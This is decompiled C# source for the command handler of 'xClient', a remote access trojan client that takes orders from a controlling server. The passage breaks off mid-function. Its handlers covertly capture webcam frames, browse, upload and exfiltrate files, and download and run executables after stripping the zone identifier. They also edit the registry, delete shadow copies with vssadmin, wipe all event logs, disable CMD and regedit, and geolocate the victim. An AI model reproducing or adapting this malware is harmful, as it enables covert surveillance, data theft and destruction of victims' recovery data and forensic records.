using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security;
using System.Speech.Synthesis;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using AForge.Video;
using AForge.Video.DirectShow;
using Microsoft.Win32;
using xClient.Config;
using xClient.Core.Data;
using xClient.Core.Extensions;
using xClient.Core.Helper;
using xClient.Core.Installation;
using xClient.Core.Networking;
using xClient.Core.Packets.ClientPackets;
using xClient.Core.Packets.ServerPackets;
using xClient.Core.Recovery.Browsers;
using xClient.Core.Recovery.FtpClients;
using xClient.Core.Registry;
using xClient.Core.Utilities;
using xClient.Enums;

namespace xClient.Core.Commands;

public static class CommandHandler
{
	public struct MibTcprowOwnerPid
	{
		public uint state;

		public uint localAddr;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
		public byte[] localPort;

		public uint remoteAddr;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
		public byte[] remotePort;

		public uint owningPid;

		public IPAddress LocalAddress => new IPAddress(localAddr);

		public ushort LocalPort => BitConverter.ToUInt16(new byte[2]
		{
			localPort[1],
			localPort[0]
		}, 0);

		public IPAddress RemoteAddress => new IPAddress(remoteAddr);

		public ushort RemotePort => BitConverter.ToUInt16(new byte[2]
		{
			remotePort[1],
			remotePort[0]
		}, 0);
	}

	public struct MibTcptableOwnerPid
	{
		public uint dwNumEntries;

		private readonly MibTcprowOwnerPid table;
	}

	private enum TcpTableClass
	{
		TcpTableBasicListener,
		TcpTableBasicConnections,
		TcpTableBasicAll,
		TcpTableOwnerPidListener,
		TcpTableOwnerPidConnections,
		TcpTableOwnerPidAll,
		TcpTableOwnerModuleListener,
		TcpTableOwnerModuleConnections,
		TcpTableOwnerModuleAll
	}

	public class Taskbar
	{
		private const int SW_HIDE = 0;

		private const int SW_SHOW = 1;

		protected static int Handle => FindWindow("Shell_TrayWnd", "");

		protected static int HandleOfStartButton => FindWindowEx(GetDesktopWindow(), 0, "button", 0);

		[DllImport("user32.dll")]
		private static extern int FindWindow(string className, string windowText);

		[DllImport("user32.dll")]
		private static extern int ShowWindow(int hwnd, int command);

		[DllImport("user32.dll")]
		public static extern int FindWindowEx(int parentHandle, int childAfter, string className, int windowTitle);

		[DllImport("user32.dll")]
		private static extern int GetDesktopWindow();

		private Taskbar()
		{
		}

		public static void Show()
		{
			ShowWindow(Handle, 1);
			ShowWindow(HandleOfStartButton, 1);
		}

		public static void Hide()
		{
			ShowWindow(Handle, 0);
			ShowWindow(HandleOfStartButton, 0);
		}
	}

	public class OpenOrCloseCDDrive
	{
		protected const int IntMciSuccess = 0;

		protected const int IntBufferSize = 127;

		[DllImport("winmm.dll", CharSet = CharSet.Auto, EntryPoint = "mciSendString")]
		public static extern int MciSendString(string command, StringBuilder buffer, int bufferSize, IntPtr hwndCallback);

		public static void Open(DriveInfo cdDrive)
		{
			if (cdDrive.DriveType == DriveType.CDRom)
			{
				StringBuilder buffer = new StringBuilder();
				MciSendString($"set CDAudio!{cdDrive.Name} door open", buffer, 127, IntPtr.Zero);
			}
		}

		public static void Close(DriveInfo cdDrive)
		{
			if (cdDrive.DriveType == DriveType.CDRom)
			{
				StringBuilder buffer = new StringBuilder();
				MciSendString($"set CDAudio!{cdDrive.Name} door closed", buffer, 127, IntPtr.Zero);
			}
		}
	}

	public static bool WebcamStarted;

	public static bool NeedsCapture;

	public static Client Client;

	public static int Webcam;

	public static int Resolution;

	public static VideoCaptureDevice FinalVideo;

	public static UnsafeStreamCodec StreamCodec;

	private static Shell _shell;

	private static Dictionary<int, string> _renamedFiles = new Dictionary<int, string>();

	private static Dictionary<int, string> _canceledDownloads = new Dictionary<int, string>();

	private const string DELIMITER = "$E$";

	private static readonly Semaphore _limitThreads = new Semaphore(2, 2);

	public static string BotKillDone = "";

	public static void HandleGetRegistryKey(DoLoadRegistryKey packet, Client client)
	{
		GetRegistryKeysResponse getRegistryKeysResponse = new GetRegistryKeysResponse();
		try
		{
			RegistrySeeker registrySeeker = new RegistrySeeker();
			registrySeeker.BeginSeeking(packet.RootKeyName);
			getRegistryKeysResponse.Matches = registrySeeker.Matches;
			getRegistryKeysResponse.IsError = false;
		}
		catch (Exception ex)
		{
			getRegistryKeysResponse.IsError = true;
			getRegistryKeysResponse.ErrorMsg = ex.Message;
		}
		getRegistryKeysResponse.RootKey = packet.RootKeyName;
		getRegistryKeysResponse.Execute(client);
	}

	public static void HandleCreateRegistryKey(DoCreateRegistryKey packet, Client client)
	{
		GetCreateRegistryKeyResponse getCreateRegistryKeyResponse = new GetCreateRegistryKeyResponse();
		string errorMsg = "";
		string name = "";
		try
		{
			getCreateRegistryKeyResponse.IsError = !RegistryEditor.CreateRegistryKey(packet.ParentPath, out name, out errorMsg);
		}
		catch (Exception ex)
		{
			getCreateRegistryKeyResponse.IsError = true;
			errorMsg = ex.Message;
		}
		getCreateRegistryKeyResponse.ErrorMsg = errorMsg;
		getCreateRegistryKeyResponse.Match = new RegSeekerMatch(name, RegistryKeyHelper.GetDefaultValues(), 0);
		getCreateRegistryKeyResponse.ParentPath = packet.ParentPath;
		getCreateRegistryKeyResponse.Execute(client);
	}

	public static void HandleDeleteRegistryKey(DoDeleteRegistryKey packet, Client client)
	{
		GetDeleteRegistryKeyResponse getDeleteRegistryKeyResponse = new GetDeleteRegistryKeyResponse();
		string errorMsg = "";
		try
		{
			getDeleteRegistryKeyResponse.IsError = !RegistryEditor.DeleteRegistryKey(packet.KeyName, packet.ParentPath, out errorMsg);
		}
		catch (Exception ex)
		{
			getDeleteRegistryKeyResponse.IsError = true;
			errorMsg = ex.Message;
		}
		getDeleteRegistryKeyResponse.ErrorMsg = errorMsg;
		getDeleteRegistryKeyResponse.ParentPath = packet.ParentPath;
		getDeleteRegistryKeyResponse.KeyName = packet.KeyName;
		getDeleteRegistryKeyResponse.Execute(client);
	}

	public static void HandleRenameRegistryKey(DoRenameRegistryKey packet, Client client)
	{
		GetRenameRegistryKeyResponse getRenameRegistryKeyResponse = new GetRenameRegistryKeyResponse();
		string errorMsg = "";
		try
		{
			getRenameRegistryKeyResponse.IsError = !RegistryEditor.RenameRegistryKey(packet.OldKeyName, packet.NewKeyName, packet.ParentPath, out errorMsg);
		}
		catch (Exception ex)
		{
			getRenameRegistryKeyResponse.IsError = true;
			errorMsg = ex.Message;
		}
		getRenameRegistryKeyResponse.ErrorMsg = errorMsg;
		getRenameRegistryKeyResponse.ParentPath = packet.ParentPath;
		getRenameRegistryKeyResponse.OldKeyName = packet.OldKeyName;
		getRenameRegistryKeyResponse.NewKeyName = packet.NewKeyName;
		getRenameRegistryKeyResponse.Execute(client);
	}

	public static void HandleCreateRegistryValue(DoCreateRegistryValue packet, Client client)
	{
		GetCreateRegistryValueResponse getCreateRegistryValueResponse = new GetCreateRegistryValueResponse();
		string errorMsg = "";
		string name = "";
		try
		{
			getCreateRegistryValueResponse.IsError = !RegistryEditor.CreateRegistryValue(packet.KeyPath, packet.Kind, out name, out errorMsg);
		}
		catch (Exception ex)
		{
			getCreateRegistryValueResponse.IsError = true;
			errorMsg = ex.Message;
		}
		getCreateRegistryValueResponse.ErrorMsg = errorMsg;
		getCreateRegistryValueResponse.Value = new RegValueData(name, packet.Kind, packet.Kind.GetDefault());
		getCreateRegistryValueResponse.KeyPath = packet.KeyPath;
		getCreateRegistryValueResponse.Execute(client);
	}

	public static void HandleDeleteRegistryValue(DoDeleteRegistryValue packet, Client client)
	{
		GetDeleteRegistryValueResponse getDeleteRegistryValueResponse = new GetDeleteRegistryValueResponse();
		string errorMsg = "";
		try
		{
			getDeleteRegistryValueResponse.IsError = !RegistryEditor.DeleteRegistryValue(packet.KeyPath, packet.ValueName, out errorMsg);
		}
		catch (Exception ex)
		{
			getDeleteRegistryValueResponse.IsError = true;
			errorMsg = ex.Message;
		}
		getDeleteRegistryValueResponse.ErrorMsg = errorMsg;
		getDeleteRegistryValueResponse.ValueName = packet.ValueName;
		getDeleteRegistryValueResponse.KeyPath = packet.KeyPath;
		getDeleteRegistryValueResponse.Execute(client);
	}

	public static void HandleRenameRegistryValue(DoRenameRegistryValue packet, Client client)
	{
		GetRenameRegistryValueResponse getRenameRegistryValueResponse = new GetRenameRegistryValueResponse();
		string errorMsg = "";
		try
		{
			getRenameRegistryValueResponse.IsError = !RegistryEditor.RenameRegistryValue(packet.OldValueName, packet.NewValueName, packet.KeyPath, out errorMsg);
		}
		catch (Exception ex)
		{
			getRenameRegistryValueResponse.IsError = true;
			errorMsg = ex.Message;
		}
		getRenameRegistryValueResponse.ErrorMsg = errorMsg;
		getRenameRegistryValueResponse.KeyPath = packet.KeyPath;
		getRenameRegistryValueResponse.OldValueName = packet.OldValueName;
		getRenameRegistryValueResponse.NewValueName = packet.NewValueName;
		getRenameRegistryValueResponse.Execute(client);
	}

	public static void HandleChangeRegistryValue(DoChangeRegistryValue packet, Client client)
	{
		GetChangeRegistryValueResponse getChangeRegistryValueResponse = new GetChangeRegistryValueResponse();
		string errorMsg = "";
		try
		{
			getChangeRegistryValueResponse.IsError = !RegistryEditor.ChangeRegistryValue(packet.Value, packet.KeyPath, out errorMsg);
		}
		catch (Exception ex)
		{
			getChangeRegistryValueResponse.IsError = true;
			errorMsg = ex.Message;
		}
		getChangeRegistryValueResponse.ErrorMsg = errorMsg;
		getChangeRegistryValueResponse.KeyPath = packet.KeyPath;
		getChangeRegistryValueResponse.Value = packet.Value;
		getChangeRegistryValueResponse.Execute(client);
	}

	public static void HandleGetConnections(Client client, GetConnections packet)
	{
		MibTcprowOwnerPid[] table = GetTable();
		string[] array = new string[table.Length];
		string[] array2 = new string[table.Length];
		string[] array3 = new string[table.Length];
		string[] array4 = new string[table.Length];
		string[] array5 = new string[table.Length];
		byte[] array6 = new byte[table.Length];
		for (int i = 0; i < table.Length; i++)
		{
			array2[i] = table[i].LocalAddress.ToString();
			array3[i] = table[i].LocalPort.ToString();
			array4[i] = table[i].RemoteAddress.ToString();
			array5[i] = table[i].RemotePort.ToString();
			array6[i] = Convert.ToByte(table[i].state);
			try
			{
				Process processById = Process.GetProcessById((int)table[i].owningPid);
				array[i] = processById.ProcessName;
			}
			catch
			{
				array[i] = $"PID: {table[i].owningPid}";
			}
		}
		new GetConnectionsResponse(array, array2, array3, array4, array5, array6).Execute(client);
	}

	public static void HandleDoCloseConnection(Client client, DoCloseConnection packet)
	{
		MibTcprowOwnerPid[] table = GetTable();
		bool flag = false;
		for (int i = 0; i < table.Length; i++)
		{
			if (packet.LocalPort.ToString() == table[i].LocalPort.ToString() && packet.RemotePort.ToString() == table[i].RemotePort.ToString())
			{
				flag = true;
				table[i].state = 12u;
				IntPtr intPtr = Marshal.AllocCoTaskMem(Marshal.SizeOf((object)table[i]));
				Marshal.StructureToPtr((object)table[i], intPtr, fDeleteOld: false);
				SetTcpEntry(intPtr);
			}
		}
		if (flag)
		{
			HandleGetConnections(client, new GetConnections());
		}
	}

	public static MibTcprowOwnerPid[] GetTable()
	{
		int ipVersion = 2;
		int dwOutBufLen = 0;
		GetExtendedTcpTable(IntPtr.Zero, ref dwOutBufLen, sort: true, ipVersion, TcpTableClass.TcpTableOwnerPidAll);
		IntPtr intPtr = Marshal.AllocHGlobal(dwOutBufLen);
		try
		{
			if (GetExtendedTcpTable(intPtr, ref dwOutBufLen, sort: true, ipVersion, TcpTableClass.TcpTableOwnerPidAll) != 0)
			{
				return null;
			}
			MibTcptableOwnerPid mibTcptableOwnerPid = (MibTcptableOwnerPid)Marshal.PtrToStructure(intPtr, typeof(MibTcptableOwnerPid));
			IntPtr intPtr2 = (IntPtr)((long)intPtr + Marshal.SizeOf((object)mibTcptableOwnerPid.dwNumEntries));
			MibTcprowOwnerPid[] array = new MibTcprowOwnerPid[mibTcptableOwnerPid.dwNumEntries];
			for (int i = 0; i < mibTcptableOwnerPid.dwNumEntries; i++)
			{
				MibTcprowOwnerPid mibTcprowOwnerPid = (array[i] = (MibTcprowOwnerPid)Marshal.PtrToStructure(intPtr2, typeof(MibTcprowOwnerPid)));
				intPtr2 = (IntPtr)((long)intPtr2 + Marshal.SizeOf((object)mibTcprowOwnerPid));
			}
			return array;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	[DllImport("iphlpapi.dll", SetLastError = true)]
	private static extern uint GetExtendedTcpTable(IntPtr pTcpTable, ref int dwOutBufLen, bool sort, int ipVersion, TcpTableClass tblClass, uint reserved = 0u);

	[DllImport("iphlpapi.dll")]
	private static extern int SetTcpEntry(IntPtr pTcprow);

	public static void HandleGetWebcams(GetWebcams command, Client client)
	{
		Dictionary<string, List<Size>> dictionary = new Dictionary<string, List<Size>>();
		foreach (FilterInfo item in new FilterInfoCollection(FilterCategory.VideoInputDevice))
		{
			List<Size> list = new List<Size>();
			VideoCapabilities[] videoCapabilities = new VideoCaptureDevice(item.MonikerString).VideoCapabilities;
			foreach (VideoCapabilities videoCapabilities2 in videoCapabilities)
			{
				list.Add(videoCapabilities2.FrameSize);
			}
			dictionary.Add(item.Name, list);
		}
		if (dictionary.Count > 0)
		{
			new GetWebcamsResponse(dictionary).Execute(client);
		}
	}

	public static void HandleGetWebcam(GetWebcam command, Client client)
	{
		Client = client;
		NeedsCapture = true;
		Webcam = command.Webcam;
		Resolution = command.Resolution;
		if (!WebcamStarted)
		{
			FinalVideo = new VideoCaptureDevice(new FilterInfoCollection(FilterCategory.VideoInputDevice)[command.Webcam].MonikerString);
			FinalVideo.NewFrame += FinalVideo_NewFrame;
			FinalVideo.VideoResolution = FinalVideo.VideoCapabilities[command.Resolution];
			FinalVideo.Start();
			WebcamStarted = true;
		}
	}

	public static void HandleDoWebcamStop(DoWebcamStop command, Client client)
	{
		NeedsCapture = false;
		WebcamStarted = false;
		Client = null;
		if (FinalVideo != null)
		{
			FinalVideo.NewFrame -= FinalVideo_NewFrame;
			FinalVideo.Stop();
			FinalVideo = null;
		}
	}

	private static void FinalVideo_NewFrame(object sender, NewFrameEventArgs e)
	{
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		if (!WebcamStarted)
		{
			FinalVideo.Stop();
		}
		if (NeedsCapture)
		{
			Bitmap val = (Bitmap)((Image)e.Frame).Clone();
			using (MemoryStream memoryStream = new MemoryStream())
			{
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Bmp());
				new GetWebcamResponse(memoryStream.ToArray(), Webcam, Resolution).Execute(Client);
				memoryStream.Close();
			}
			NeedsCapture = false;
		}
	}

	public static void HandleGetAuthentication(GetAuthentication command, Client client)
	{
		GeoLocationHelper.Initialize();
		new GetAuthenticationResponse(Settings.VERSION, PlatformHelper.FullName, WindowsAccountHelper.GetAccountType(), GeoLocationHelper.GeoInfo.Country, GeoLocationHelper.GeoInfo.CountryCode, GeoLocationHelper.GeoInfo.Region, GeoLocationHelper.GeoInfo.City, GeoLocationHelper.ImageIndex, DevicesHelper.HardwareId, WindowsAccountHelper.GetName(), SystemHelper.GetPcName(), Settings.TAG).Execute(client);
		if (ClientData.AddToStartupFailed)
		{
			Thread.Sleep(2000);
			new SetStatus("Adding to startup failed.").Execute(client);
		}
	}

	public static void HandleDoClientUpdate(DoClientUpdate command, Client client)
	{
		if (string.IsNullOrEmpty(command.DownloadURL))
		{
			if (!_renamedFiles.ContainsKey(command.ID))
			{
				_renamedFiles.Add(command.ID, FileHelper.GetTempFilePath(".exe"));
			}
			string text = _renamedFiles[command.ID];
			try
			{
				if (command.CurrentBlock == 0 && !FileHelper.IsValidExecuteableFile(command.Block))
				{
					throw new Exception("No executable file");
				}
				FileSplit fileSplit = new FileSplit(text);
				if (!fileSplit.AppendBlock(command.Block, command.CurrentBlock))
				{
					throw new Exception(fileSplit.LastError);
				}
				if (command.CurrentBlock + 1 == command.MaxBlocks)
				{
					if (_renamedFiles.ContainsKey(command.ID))
					{
						_renamedFiles.Remove(command.ID);
					}
					new SetStatus("Updating...").Execute(client);
					ClientUpdater.Update(client, text);
				}
				return;
			}
			catch (Exception ex)
			{
				if (_renamedFiles.ContainsKey(command.ID))
				{
					_renamedFiles.Remove(command.ID);
				}
				NativeMethods.DeleteFile(text);
				new SetStatus($"Update failed: {ex.Message}").Execute(client);
				return;
			}
		}
		new Thread((ThreadStart)delegate
		{
			new SetStatus("Downloading file...").Execute(client);
			string tempFilePath = FileHelper.GetTempFilePath(".exe");
			try
			{
				using WebClient webClient = new WebClient();
				webClient.Proxy = null;
				webClient.DownloadFile(command.DownloadURL, tempFilePath);
			}
			catch
			{
				new SetStatus("Download failed!").Execute(client);
				return;
			}
			new SetStatus("Updating...").Execute(client);
			ClientUpdater.Update(client, tempFilePath);
		}).Start();
	}

	public static void HandleDoClientUninstall(DoClientUninstall command, Client client)
	{
		new SetStatus("Uninstalling... bye ;(").Execute(client);
		ClientUninstaller.Uninstall(client);
	}

	public static void HandleDoClientRestoreDel(DoClientRestoreDel command, Client client)
	{
		new SetStatus("Trying to delete restore points.").Execute(client);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				FileName = "cmd.exe",
				Arguments = "/C vssadmin.exe Delete Shadows /All /Quiet",
				Verb = "runas"
			};
			process.Start();
		}
		catch
		{
		}
		new SetStatus("Restore points deleted.").Execute(client);
	}

	public static void HandleDoTextToSpeech(DoTextToSpeech command, Client client)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		SpeechSynthesizer speechSynthesizerObj = new SpeechSynthesizer();
		new Thread((ThreadStart)delegate
		{
			//IL_0001: Unknown result type (might be due to invalid IL or missing references)
			//IL_000b: Expected O, but got Unknown
			speechSynthesizerObj = new SpeechSynthesizer();
			speechSynthesizerObj.SpeakAsync(command.Text);
		}).Start();
		new SetStatus("Text to Speech!").Execute(client);
	}

	public static void HandleDoRunBotkiller(DoRunBotkiller command, Client client)
	{
		new SetStatus("Starting botkiller!").Execute(client);
		Botkiller.scan();
		new SetStatus("Botkilled!").Execute(client);
	}

	public static void HandleDoDisableCMD(DoDisableCMD command, Client client)
	{
		try
		{
			_ = command.ToString() == "1";
			RegistryKey registryKey = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
			if (registryKey.GetValue("DisableCMD") == null)
			{
				registryKey.SetValue("DisableCMD", "1");
				new SetStatus("CMD Disabled!").Execute(client);
			}
			else
			{
				registryKey.DeleteValue("DisableCMD");
				new SetStatus("CMD Enabled!").Execute(client);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void HandleDoWallpaper(DoWallpaper command, Client client)
	{
		string text = Path.GetRandomFileName().Replace(".", string.Empty);
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text + DateTime.Now.Millisecond;
		SetWallpaperFromWeb(command.URL, path);
		new SetStatus("Wallpaper set!").Execute(client);
	}

	public static void SetWallpaper(string path)
	{
		SystemParametersInfo(20u, 0u, path, 3u);
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void SetWallpaperFromWeb(string url, string path)
	{
		try
		{
			new WebClient().DownloadFile(new Uri(url), path);
			SetWallpaper(path);
		}
		catch
		{
		}
	}

	public static void HandleDoHideTaskbar(DoHideTaskbar command, Client client)
	{
		if (command.Text == "hide")
		{
			Taskbar.Hide();
			new SetStatus("Taskbar hidden!").Execute(client);
		}
		if (command.Text == "show")
		{
			Taskbar.Show();
			new SetStatus("Taskbar shown!").Execute(client);
		}
	}

	[DllImport("user32.dll")]
	public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

	[DllImport("user32.dll")]
	public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	public static void HandleDoHideDesktop(DoHideDesktop command, Client client)
	{
		if (command.Text == "hide")
		{
			ShowWindow(FindWindow("Progman", "Program Manager"), 0);
			new SetStatus("Desktop Hidden!").Execute(client);
		}
		if (command.Text == "show")
		{
			ShowWindow(FindWindow("Progman", "Program Manager"), 5);
			new SetStatus(" Desktop Shown!").Execute(client);
		}
	}

	[DllImport("user32.dll")]
	public static extern int SwapMouseButton(int bSwap);

	public static void HandleDoSwapButtons(DoSwapButtons command, Client client)
	{
		if (command.Text == "swap")
		{
			SwapMouseButton(1);
			new SetStatus("Mouse buttons reversed!").Execute(client);
		}
		if (command.Text == "normal")
		{
			SwapMouseButton(0);
			new SetStatus("Mouse buttons set to normal!").Execute(client);
		}
	}

	public static void HandleDoCD(DoCD command, Client client)
	{
		DriveInfo[] drives;
		if (command.Text == "open")
		{
			drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.DriveType == DriveType.CDRom)
				{
					OpenOrCloseCDDrive.Open(driveInfo);
				}
			}
			new SetStatus("CD Open!").Execute(client);
		}
		if (!(command.Text == "close"))
		{
			return;
		}
		drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo2 in drives)
		{
			if (driveInfo2.DriveType == DriveType.CDRom)
			{
				OpenOrCloseCDDrive.Close(driveInfo2);
			}
		}
		new SetStatus("CD Closed!").Execute(client);
	}

	public static void HandleDoRegedit(DoRegedit command, Client client)
	{
		if (command.Text == "disable")
		{
			try
			{
				RegistryKey registryKey = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
				if (registryKey.GetValue("DisableRegistryTools") == null)
				{
					registryKey.SetValue("DisableRegistryTools", "1");
				}
				RegistryKey registryKey2 = Microsoft.Win32.Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
				if (registryKey2.GetValue("DisableRegistryTools") == null)
				{
					registryKey2.SetValue("DisableRegistryTools", "1");
				}
			}
			catch
			{
			}
		}
		if (command.Text == "enable")
		{
			try
			{
				RegistryKey registryKey3 = Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
				registryKey3.DeleteValue("DisableRegistryTools");
				registryKey3.Close();
				RegistryKey registryKey4 = Microsoft.Win32.Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
				registryKey4.DeleteValue("DisableRegistryTools");
				registryKey4.Close();
			}
			catch
			{
			}
		}
	}

	[DllImport("user32.dll")]
	internal static extern bool OpenClipboard(IntPtr hWndNewOwner);

	[DllImport("user32.dll")]
	internal static extern bool CloseClipboard();

	[DllImport("user32.dll")]
	internal static extern bool SetClipboardData(uint uFormat, IntPtr data);

	[STAThread]
	public static void HandleDoClearClipboard(DoClearClipboard command, Client client)
	{
		OpenClipboard(IntPtr.Zero);
		IntPtr intPtr = Marshal.StringToHGlobalUni(string.Empty);
		SetClipboardData(13u, intPtr);
		CloseClipboard();
		Marshal.FreeHGlobal(intPtr);
		new SetStatus("Clipboard Cleared!").Execute(client);
	}

	public static void HandleDoClearEvents(DoClearEvents command, Client client)
	{
		try
		{
			EventLog[] eventLogs = EventLog.GetEventLogs();
			foreach (EventLog obj in eventLogs)
			{
				obj.Clear();
				((Component)(object)obj).Dispose();
			}
			new SetStatus("Events Cleared!").Execute(client);
		}
		catch (Exception)
		{
			new SetStatus("Admin rights required!").Execute(client);
		}
	}

	public static void HandleClipboardSet(DoClipboardSet command, Client client)
	{
		OpenClipboard(IntPtr.Zero);
		IntPtr intPtr = Marshal.StringToHGlobalUni(command.Text);
		SetClipboardData(13u, intPtr);
		CloseClipboard();
		Marshal.FreeHGlobal(intPtr);
		new SetStatus("Clipboard Set!").Execute(client);
	}

	public static void HandleGetDirectory(GetDirectory command, Client client)
	{
		bool isError = false;
		string message = null;
		Action<string> action = delegate(string msg)
		{
			isError = true;
			message = msg;
		};
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(command.RemotePath);
			FileInfo[] files = directoryInfo.GetFiles();
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			string[] array = new string[files.Length];
			long[] array2 = new long[files.Length];
			string[] array3 = new string[directories.Length];
			int num = 0;
			FileInfo[] array4 = files;
			foreach (FileInfo fileInfo in array4)
			{
				array[num] = fileInfo.Name;
				array2[num] = fileInfo.Length;
				num++;
			}
			if (array.Length == 0)
			{
				array = new string[1] { "$E$" };
				array2 = new long[1];
			}
			num = 0;
			DirectoryInfo[] array5 = directories;
			foreach (DirectoryInfo directoryInfo2 in array5)
			{
				array3[num] = directoryInfo2.Name;
				num++;
			}
			if (array3.Length == 0)
			{
				array3 = new string[1] { "$E$" };
			}
			new GetDirectoryResponse(array, array3, array2).Execute(client);
		}
		catch (UnauthorizedAccessException)
		{
			action("GetDirectory No permission");
		}
		catch (SecurityException)
		{
			action("GetDirectory No permission");
		}
		catch (PathTooLongException)
		{
			action("GetDirectory Path too long");
		}
		catch (DirectoryNotFoundException)
		{
			action("GetDirectory Directory not found");
		}
		catch (FileNotFoundException)
		{
			action("GetDirectory File not found");
		}
		catch (IOException)
		{
			action("GetDirectory I/O error");
		}
		catch (Exception)
		{
			action("GetDirectory Failed");
		}
		finally
		{
			if (isError && !string.IsNullOrEmpty(message))
			{
				new SetStatusFileManager(message, setLastDirectorySeen: true).Execute(client);
			}
		}
	}

	public static void HandleDoDownloadFile(DoDownloadFile command, Client client)
	{
		new Thread((ThreadStart)delegate
		{
			_limitThreads.WaitOne();
			try
			{
				FileSplit fileSplit = new FileSplit(command.RemotePath);
				if (fileSplit.MaxBlocks < 0)
				{
					throw new Exception(fileSplit.LastError);
				}
				for (int i = 0; i < fileSplit.MaxBlocks; i++)
				{
					if (!client.Connected)
					{
						break;
					}
					if (_canceledDownloads.ContainsKey(command.ID))
					{
						break;
					}
					if (!fileSplit.ReadBlock(i, out var readBytes))
					{
						throw new Exception(fileSplit.LastError);
					}
					new DoDownloadFileResponse(command.ID, Path.GetFileName(command.RemotePath), readBytes, fileSplit.MaxBlocks, i, fileSplit.LastError).Execute(client);
				}
			}
			catch (Exception ex)
			{
				new DoDownloadFileResponse(command.ID, Path.GetFileName(command.RemotePath), new byte[0], -1, -1, ex.Message).Execute(client);
			}
			_limitThreads.Release();
		}).Start();
	}

	public static void HandleDoDownloadFileCancel(DoDownloadFileCancel command, Client client)
	{
		if (!_canceledDownloads.ContainsKey(command.ID))
		{
			_canceledDownloads.Add(command.ID, "canceled");
			new DoDownloadFileResponse(command.ID, "canceled", new byte[0], -1, -1, "Canceled").Execute(client);
		}
	}

	public static void HandleDoUploadFile(DoUploadFile command, Client client)
	{
		if (command.CurrentBlock == 0 && File.Exists(command.RemotePath))
		{
			NativeMethods.DeleteFile(command.RemotePath);
		}
		new FileSplit(command.RemotePath).AppendBlock(command.Block, command.CurrentBlock);
	}

	public static void HandleDoPathDelete(DoPathDelete command, Client client)
	{
		bool isError = false;
		string message = null;
		Action<string> action = delegate(string msg)
		{
			isError = true;
			message = msg;
		};
		try
		{
			switch (command.PathType)
			{
			case PathType.Directory:
				Directory.Delete(command.Path, recursive: true);
				new SetStatusFileManager("Deleted directory", setLastDirectorySeen: false).Execute(client);
				break;
			case PathType.File:
				File.Delete(command.Path);
				new SetStatusFileManager("Deleted file", setLastDirectorySeen: false).Execute(client);
				break;
			}
			HandleGetDirectory(new GetDirectory(Path.GetDirectoryName(command.Path)), client);
		}
		catch (UnauthorizedAccessException)
		{
			action("DeletePath No permission");
		}
		catch (PathTooLongException)
		{
			action("DeletePath Path too long");
		}
		catch (DirectoryNotFoundException)
		{
			action("DeletePath Path not found");
		}
		catch (IOException)
		{
			action("DeletePath I/O error");
		}
		catch (Exception)
		{
			action("DeletePath Failed");
		}
		finally
		{
			if (isError && !string.IsNullOrEmpty(message))
			{
				new SetStatusFileManager(message, setLastDirectorySeen: false).Execute(client);
			}
		}
	}

	public static void HandleDoPathRename(DoPathRename command, Client client)
	{
		bool isError = false;
		string message = null;
		Action<string> action = delegate(string msg)
		{
			isError = true;
			message = msg;
		};
		try
		{
			switch (command.PathType)
			{
			case PathType.Directory:
				Directory.Move(command.Path, command.NewPath);
				new SetStatusFileManager("Renamed directory", setLastDirectorySeen: false).Execute(client);
				break;
			case PathType.File:
				File.Move(command.Path, command.NewPath);
				new SetStatusFileManager("Renamed file", setLastDirectorySeen: false).Execute(client);
				break;
			}
			HandleGetDirectory(new GetDirectory(Path.GetDirectoryName(command.NewPath)), client);
		}
		catch (UnauthorizedAccessException)
		{
			action("RenamePath No permission");
		}
		catch (PathTooLongException)
		{
			action("RenamePath Path too long");
		}
		catch (DirectoryNotFoundException)
		{
			action("RenamePath Path not found");
		}
		catch (IOException)
		{
			action("RenamePath I/O error");
		}
		catch (Exception)
		{
			action("RenamePath Failed");
		}
		finally
		{
			if (isError && !string.IsNullOrEmpty(message))
			{
				new SetStatusFileManager(message, setLastDirectorySeen: false).Execute(client);
			}
		}
	}

	public static void HandleDoDownloadAndExecute(DoDownloadAndExecute command, Client client)
	{
		new SetStatus("Downloading file...").Execute(client);
		new Thread((ThreadStart)delegate
		{
			string tempFilePath = FileHelper.GetTempFilePath(".exe");
			try
			{
				using WebClient webClient = new WebClient();
				webClient.Proxy = null;
				webClient.DownloadFile(command.URL, tempFilePath);
			}
			catch
			{
				new SetStatus("Download failed!").Execute(client);
				return;
			}
			new SetStatus("Downloaded File!").Execute(client);
			try
			{
				FileHelper.DeleteZoneIdentifier(tempFilePath);
				if (!FileHelper.IsValidExecuteableFile(File.ReadAllBytes(tempFilePath)))
				{
					throw new Exception("no pe file");
				}
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				if (command.RunHidden)
				{
